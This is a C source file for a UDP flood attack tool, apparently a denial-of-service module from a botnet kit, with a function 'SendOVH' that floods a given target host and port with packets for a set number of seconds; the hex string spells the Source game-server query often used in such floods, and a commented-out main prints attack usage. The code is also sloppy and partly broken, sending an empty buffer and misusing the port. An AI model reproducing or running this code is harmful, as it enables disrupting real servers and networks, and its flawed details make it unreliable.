#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>

#pragma once 
#define FATTI_PACKETS 1460

void SendOVH(unsigned char *Target, int Port, int Secs)
{
    int SERVER_METHOD;
    SERVER_METHOD = socket(AF_INET, SOCK_DGRAM, 0);
    time_t start = time(NULL);
    struct sockaddr_in sin;
    struct hostent *hp;
    unsigned char *HexString = malloc(1024);
    memset(HexString, 0, 1024);
    hp = gethostbyname(Target);
    bzero((char*) &sin,sizeof(sin));
    bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
    sin.sin_family = hp->h_addrtype;
    sin.sin_port = Port;
    unsigned int a = 0;
    while(1)
    {
        char * RANDOMHEXGEN[] = {    
        "",
		};
		
        if (a >= 50)
        {
            
            int length;
            char RANDOMHEXGEN[] = "\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79 + /x54/x53/x6f/x75/x72/x63/x65/x20/x45/x6e/x67/x69/x6e/x65/x20/x51/x75/x65/x72/x79 rfdknjms";
            /* Seed number for rand() */
            srand((unsigned int) time(0) + getpid());
            length = rand() % 15 + 8;
            send(SERVER_METHOD, HexString, FATTI_PACKETS, 0);
            connect(SERVER_METHOD,(struct sockaddr *) &sin, sizeof(sin));
            if (time(NULL) >= start + Secs)
            {
                close(SERVER_METHOD);
                exit(0);
            }
            a = 0;
        }
        a++;
    }
}

// main(int argc, char **argv)
// {
//     if(argc < 2)
//     {
//         printf("\x1b[31m[Invalid Syntax] Usage = %s <METHOD(SERVER)>\x1b[0m\n", argv[0]);
//         exit(1);
//     }
//     if(!strcmp(argv[1], "SERVER"))
//     {
//         if(argc < 4)
//         {
//             printf("\n\x1b[31m[Invalid Syntax] Usage = %s SERVER <TARGET> <PORT> <TIME>\x1b[0m\n", argv[0]);
//             exit(0);
//         }
//         else
//         {
//             unsigned char *Target = argv[2];
//             int Port = atoi(argv[3]);
//             int Time = atoi(argv[4]);
//             printf("\n\x1b[1;36m[+] Hex Railing -> %s For %s Seconds | CNTRL+Z To Stop [+]\x1b[0m\n", argv[2], argv[4]);
//             SendOVH(Target, Port, Time);
//             exit(0);
//         }
//     }
// }